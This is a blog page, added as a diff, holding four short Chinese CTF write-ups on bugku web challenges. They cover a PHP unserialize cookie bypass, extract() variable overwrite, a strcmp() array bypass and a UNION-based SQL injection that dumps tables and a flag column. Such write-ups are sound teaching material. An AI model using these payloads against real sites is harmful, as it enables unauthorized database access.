@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    
+    summerN&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="jumbotron">
+  <div class="video">
+    
+      <div class="video-frame">
+        <img src="/images/ocean/overlay-hero.png" alt="Decorative image frame">
+      </div>
+    
+    <div class="video-media">
+      <video playsinline="" autoplay="" loop="" muted="" data-autoplay=""
+             poster="/images/ocean/ocean.png" x5-video-player-type="h5">
+        <source src="/images/ocean/ocean.mp4" type="video/mp4">
+        <source src="/images/ocean/ocean.ogv" type="video/ogg">
+        <source src="/images/ocean/ocean.webm" type="video/webm">
+        <p>Your user agent does not support the HTML5 Video element.</p>
+      </video>
+      <div class="video-overlay"></div>
+    </div>
+    <div class="video-inner text-center text-white">
+      <h1><a href="/">summerN&#39;s blog</a></h1>
+      <p></p>
+      <div><img src="/images/hexo-inverted.svg" class="brand" alt="summerN&#39;s blog"></div>
+    </div>
+    <div class="video-learn-more">
+      <a class="anchor" href="#landingpage"><i class="fe fe-mouse"></i></a>
+    </div>
+  </div>
+</section>
+
+<div id="landingpage">
+  <section class="outer">
+  <article class="articles">
+    
+    <h1 class="page-type-title"></h1>
+
+    
+      
+        
+
+<article id="post-flag.php bugku  web" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/12/16/flag.php%20bugku%20%20web/">flag.php bugku  web</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/16/flag.php%20bugku%20%20web/" class="article-date">
+  <time datetime="2019-12-16T02:37:33.839Z" itemprop="datePublished">2019-12-16</time>
+</a>
+        
+      </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h2 id="bugku-web-flag-php"><a href="#bugku-web-flag-php" class="headerlink" title="bugku    web        flag.php"></a><strong>bugku    web        flag.php</strong></h2><p>打开题目网页<br>首先尝试了一下简单的sql注入<br>但是没用<br><img src="https://img-blog.csdnimg.cn/20190308190046343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">想了一会后，发现提示hint<br>所以我们尝试一下使用get方法传入hint任意值<br>即?hint=1<br>传入后发现一页代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>之后我们查看开头的代码<br>发现要将cookie指进行序列化后<br>使与key值相等即可得到flag<br>但是<br>注意：下方的key值并不是我们需要的<br>而我们需要的key值在程序中并没有赋值<br>因此为NULL<br>所以有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$KEY&#x3D;&quot;&quot;;</span><br><span class="line">print(serialize($KEY));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>因为我们并没有对$key进行赋值因此求序列化的程序如上所示<br>之后我们可以使用火狐上的hackbar<br>上传cookies<br>即ISecer=s:0:””%3b<br>因为；无法上传 ， 因此我们使用其的url码上传<br>注意，上传的时候要在没有get  hint的页面中进行<br>否则无法显示flag</p>
+<p>萌新  还请大佬指教<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/16/flag.php%20bugku%20%20web/" data-id="ck48f5u8w0003z8u34md4c2gt"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+
+
+
+      
+        
+
+<article id="post-extract（）变量漏洞" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/">extract（）变量漏洞</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2019-12-16T02:37:33.823Z" itemprop="datePublished">2019-12-16</time>
+</a>
+        
+      </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h2 id="php代码审计日志一（bugku-extract变量覆盖）"><a href="#php代码审计日志一（bugku-extract变量覆盖）" class="headerlink" title="php代码审计日志一（bugku  extract变量覆盖）"></a>php代码审计日志一（bugku  extract变量覆盖）</h2><p>题目来源：bugku<br>代码为：<br><img src="https://img-blog.csdnimg.cn/20190309083831775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们先了解一下extract（）函数<br><img src="https://img-blog.csdnimg.cn/20190309083932380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后我们再了解一下php中的extract（）漏洞</p>
+<p><img src="https://img-blog.csdnimg.cn/2019030908412227.png" alt="在这里插入图片描述"><br>第一次我所构造的为：<br>?shiyan=1&amp;flag=1<br>但是不行<br>我查了一些大佬的wp后发现有：<br><img src="https://img-blog.csdnimg.cn/20190309084444350.png" alt="在这里插入图片描述">之后我们就可以得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/" data-id="ck48f5u8t0001z8u36sig7y59"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+
+
+
+      
+        
+
+<article id="post-csdn_export_md" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/12/16/csdn_export_md/">csdn_export_md</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/16/csdn_export_md/" class="article-date">
+  <time datetime="2019-12-16T02:37:33.807Z" itemprop="datePublished">2019-12-16</time>
+</a>
+        
+      </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h2 id="代码审计之strcmp（）漏洞"><a href="#代码审计之strcmp（）漏洞" class="headerlink" title="代码审计之strcmp（）漏洞"></a>代码审计之strcmp（）漏洞</h2><p>先了解一下此漏洞：<br><strong>strcmp(str1,str2)比较两个字符串，如果相等就返回0。</strong></p>
+<p>在5.3版本前，如果传入的不是字符串，那么会报错，并且return 0，返回0就代表相等了。<br>绕过strcmp就想办法传入数组吧，只需要v3[]=3即可。</p>
+<p>之后我们通过一个题来做一个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class="line">if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">&#x2F;&#x2F;比较两个字符串（区分大小写）</span><br><span class="line">die(&#39;Flag: &#39;.$flag);</span><br><span class="line">else</span><br><span class="line">print &#39;No&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>因此我们可以构造<br>?a[]=1<br>即可得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/16/csdn_export_md/" data-id="ck48f5u8v0002z8u39mhw8rbt"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+
+
+
+      
+        
+
+<article id="post-bugku成绩单" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h2 itemprop="name">
+      <a class="article-title" href="/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/">bugku成绩单</a>
+    </h2>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/" class="article-date">
+  <time datetime="2019-12-16T02:37:33.714Z" itemprop="datePublished">2019-12-16</time>
+</a>
+        
+      </div>
+    
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <h2 id="bugku成绩单-详细解析"><a href="#bugku成绩单-详细解析" class="headerlink" title="bugku成绩单  详细解析"></a>bugku成绩单  详细解析</h2><p>1，我们首先分别输入1,2,3，<br>均有输出<br>我们输入1’<br>没有回响<br>因此我们可以判断存在sql注入<br>2.我们分别输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 1#</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; order by 3#</span><br><span class="line">1&#39; order by 4#</span><br></pre></td></tr></table></figure>
+<p>均有回响<br>但是当我们使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 5#</span><br></pre></td></tr></table></figure>
+<p>时，没有回响<br>因此我们可以根据此判断字段数为4<br>3，<br>之后就是最精彩的地方了<br>之后我们联合查询<br>我们先输入<br>注意（select好像tm的不是查询，，好像是赋值。。）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,3,4#</span><br></pre></td></tr></table></figure>
+<p>没有显示有用的东西<br>因为id=1  所以我们的东西被覆盖<br>因此呢<br>我们输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5&#39; union select 1,2,3,database()#</span><br></pre></td></tr></table></figure>
+<p>即设置一个新的id，我们要select的值会显示在表上（覆盖）<br><img src="https://img-blog.csdnimg.cn/20190309162426694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>现在我们得到了一个数据库的名字<br>之后就进行爆表<br>5’union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>得到<br><img src="https://img-blog.csdnimg.cn/20190309163625472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后再进行获得里面的列<br>‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#<br>得到<br><img src="https://img-blog.csdnimg.cn/20190309164001253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们得到了列<br>之后我们获取我们要得到的东西<br>5’ union select 1,2,3,skctf_flag from fl4g#<br><img src="https://img-blog.csdnimg.cn/20190309164216346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">得到flag</p>
+<p>之后我会写一些关于sql语句的总结</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/" data-id="ck48f5u8o0000z8u3cj5s1cc3"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+
+</article>
+
+
+
+      
+  </article>
+  
+
+  
+    <nav class="page-nav">
+      
+      <a class="extend prev" rel="prev" href="/">Prev page</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    </nav>
+  
+</section>
+</div>
+
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 summerN&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+  <aside class="sidebar">
+    
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="summerN&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
